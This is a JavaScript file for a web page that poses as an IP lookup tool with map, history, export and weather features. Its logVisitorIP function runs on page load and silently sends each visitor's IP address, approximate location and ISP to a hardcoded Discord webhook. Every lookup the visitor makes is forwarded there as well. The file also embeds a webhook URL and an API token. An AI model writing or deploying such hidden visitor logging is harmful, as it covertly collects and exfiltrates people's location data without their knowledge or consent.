let ipHistory = [];
let userIpAddress = '';
let weatherInfo = 'N/A';
let currentDateTime = '';

// Log the visitor's IP when the page loads
window.onload = function() {
    logVisitorIP();
};

document.getElementById('ipForm').addEventListener('submit', function(event) {
    event.preventDefault();
    const ip = document.getElementById('ipInput').value;
    getIPInfo(ip);
});

document.getElementById('colorPicker').addEventListener('input', function(event) {
    document.body.style.backgroundColor = event.target.value;
});

function getIPInfo(ip) {
    fetch(`https://ipinfo.io/${ip}/json?token=e42c28490c7344`)
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            const ipInfo = {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country,
                location: data.loc,
                org: data.org
            };
            displayIPInfo(ipInfo);
            showMap(data.loc);
            addToHistory(ipInfo);
            enableExportButton(ipInfo);
            getWeather(data.city);
            updateDateTime();
            sendToDiscord(ipInfo);
        })
        .catch(error => {
            document.getElementById('output').innerHTML = `<p>Error fetching data</p>`;
            console.error('Error fetching data:', error);
        });
}

function displayIPInfo(data) {
    document.getElementById('output').innerHTML = `
        <p><strong>IP:</strong> ${data.ip}</p>
        <p><strong>City:</strong> ${data.city}</p>
        <p><strong>Region:</strong> ${data.region}</p>
        <p><strong>Country:</strong> ${data.country}</p>
        <p><strong>Location:</strong> ${data.location}</p>
        <p><strong>Org:</strong> ${data.org}</p>
    `;
}

function showMap(location) {
    const [lat, lon] = location.split(',');
    const map = L.map('map').setView([lat, lon], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
    }).addTo(map);
    L.marker([lat, lon]).addTo(map);
}

function addToHistory(data) {
    ipHistory.unshift(data);
    updateHistoryList();
}

function updateHistoryList() {
    const historyList = document.getElementById('ipHistory');
    historyList.innerHTML = '';
    ipHistory.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.textContent = `${item.ip} - ${item.city}`;
        listItem.onclick = () => displayIPInfo(item);
        historyList.appendChild(listItem);
    });
}

function enableExportButton(data) {
    document.getElementById('exportText').onclick = () => exportAsText(data);
}

function exportAsText(data) {
    const textContent = `
IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country}
Location: ${data.location}
Org: ${data.org}
    `;
    downloadFile(textContent.trim(), 'ip-info.txt', 'text/plain');
}

function downloadFile(content, fileName, mimeType) {
    const a = document.createElement('a');
    const blob = new Blob([content], { type: mimeType });
    a.href = URL.createObjectURL(blob);
    a.download = fileName;
    a.click();
    URL.revokeObjectURL(a.href);
}

function sendToDiscord(data) {
    const webhookUrl = 'https://discord.com/api/webhooks/1247817269388644352/9PBKTJLMhBxl_pNT56b7cDJAnjNYQ7M6NmPQEvIvQJiHwRRODZeCifRnv6Gv_BX8JwK_';
    const embed = {
        embeds: [{
            title: 'IP Lookup Result',
            fields: [
                { name: 'From', value: userIpAddress, inline: false },
                { name: 'Time', value: currentDateTime, inline: false },
                { name: 'Weather', value: weatherInfo, inline: false },
                { name: '\u200B', value: '\u200B', inline: false }, // Spacer
                { name: 'IP', value: data.ip, inline: true },
                { name: 'City', value: data.city, inline: true },
                { name: 'Region', value: data.region, inline: true },
                { name: 'Country', value: data.country, inline: true },
                { name: 'Location', value: data.location, inline: true },
                { name: 'Org', value: data.org, inline: true }
            ],
            color: 3066993
        }]
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(embed)
    }).then(response => {
        if (!response.ok) {
            console.error('Error sending message to Discord:', response.statusText);
        }
    }).catch(error => {
        console.error('Error sending message to Discord:', error);
    });
}

function logVisitorIP() {
    fetch('https://ipinfo.io/json?token=e42c28490c7344')
        .then(response => response.json())
        .then(data => {
            userIpAddress = data.ip;
            const embed = {
                embeds: [{
                    title: 'New Visitor IP',
                    fields: [
                        { name: 'IP', value: data.ip, inline: true },
                        { name: 'City', value: data.city, inline: true },
                        { name: 'Region', value: data.region, inline: true },
                        { name: 'Country', value: data.country, inline: true },
                        { name: 'Location', value: data.loc, inline: true },
                        { name: 'Org', value: data.org, inline: true }
                    ],
                    color: 3066993
                }]
            };

            fetch('https://discord.com/api/webhooks/1247817269388644352/9PBKTJLMhBxl_pNT56b7cDJAnjNYQ7M6NmPQEvIvQJiHwRRODZeCifRnv6Gv_BX8JwK_', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(embed)
            }).then(response => {
                if (!response.ok) {
                    console.error('Error sending visitor IP to Discord:', response.statusText);
                }
            }).catch(error => {
                console.error('Error sending visitor IP to Discord:', error);
            });
        })
        .catch(error => {
            console.error('Error fetching visitor IP:', error);
        });
}

// Get weather info
function getWeather(city) {
    const apiKey = 'your_openweathermap_api_key';
    fetch(`https://api.openweathermap.org/data/2.5/weather?q=${city}&units=metric&appid=${apiKey}`)
        .then(response => response.json())
        .then(data => {
            weatherInfo = `${data.weather[0].description}, ${data.main.temp}°C`;
            document.getElementById('weather').textContent = weatherInfo;
        })
        .catch(error => {
            weatherInfo = 'N/A';
            document.getElementById('weather').textContent = 'N/A';
            console.error('Error fetching weather:', error);
        });
}

// Update date and time
function updateDateTime() {
    const now = new Date();
    currentDateTime = now.toLocaleString();
    document.getElementById('datetime').textContent = currentDateTime;
    setTimeout(updateDateTime, 1000);
}
